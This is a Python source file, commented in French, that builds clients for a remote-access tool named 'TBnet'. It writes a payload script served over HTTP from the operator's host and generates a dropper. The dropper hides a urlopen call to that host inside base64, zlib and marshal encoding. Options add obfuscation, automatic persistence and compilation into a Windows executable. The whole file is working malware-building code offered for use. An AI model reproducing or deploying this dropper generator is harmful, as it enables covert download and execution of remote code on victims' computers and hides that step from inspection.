import argparse
import subprocess
import os
import shutil
import base64
import zlib
import marshal

image = """ _______  ______                __
|_     _||   __ \.-----..-----.|  |_
  |   |  |   __ <|     ||  -__||   _|
  |___|  |______/|__|__||_____||____|
"""
print(image)
parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', 
                    type=str, 
                    required=True, 
                    dest='host',
                    help='Ip du Server')
parser.add_argument('--port', 
                    type=int, 
                    required=False, 
                    dest='port',
                    default=4444,
                    help='Port du Server')
parser.add_argument('--name',
                    type=str, 
                    required=False, 
                    dest='name', 
                    default="tbnet",
                    help='Définir nom du fichier')
parser.add_argument('--persistance',
                    type=bool,
                    required=False,
                    dest='persistance',
                    default=False,
                    help='Active la persistance automatique')
parser.add_argument('--freeze',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='freeze',
                    default=False,
                    help='compile le client dans un executable')
parser.add_argument('--obf',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='obf',
                    default=False,
                    help='obfusque le code python')

args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"
    pathDirHttp = "./http/"

    def GenererClient(self, ip, port, persistance, name, freeze, obf):
        # definir url du payload
        url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
        # creer les dossier outpu et http si il n'éxiste pas
        if not os.path.exists(self.pathDirOutput):
            os.makedirs(self.pathDirOutput)
        if not os.path.exists(self.pathDirHttp):
            os.makedirs(self.pathDirHttp)
        # ecrire le payload dans http
        fichier = open(self.pathDirHttp + name + ".pyw", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()
        # obfusqué le payload
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirHttp + name + ".pyw" + " " + self.pathDirHttp + name + ".pyw")
        # ecrire le dropeur dans output
        fichier = open(self.pathDirOutput + "drop_" + name + ".pyw", "w")
        ## import sys,zlib,base64,marshal,json,urllib
        dropper = self.ReturnFichier("dropeur.txt") + "{}".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2))))) + ")))))"
        fichier.write(dropper)
        fichier.close()
        # obfusqué le droppeur
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirOutput + "drop_" + name + ".pyw" + " " + self.pathDirOutput + "drop_" + name + ".pyw")
        # si l'options freeze est choisi
        if freeze:
            ## Complier le droppeur
            os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "drop_" + name + ".pyw" + " -F --clean")
            print("Compilation terminer")
            print("Nettoyage des fichier temporaire")
            # netoyyer fichier temporaire
            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
            if os.path.exists("drop_" + name + ".spec"):
                os.remove("drop_" + name + ".spec")
            shutil.copyfile("dist/" + "drop_" + name + ".exe", self.pathDirOutput + name + ".exe")
            shutil.rmtree("dist/")
            shutil.rmtree("build/")
            shutil.rmtree("output/__pycache__")
            print("Client executable prêt : output/" + name + ".exe")
        else:
            print("Client prêt : output/" + "drop_" + name + ".pyw")

        

    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text
        

GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf)

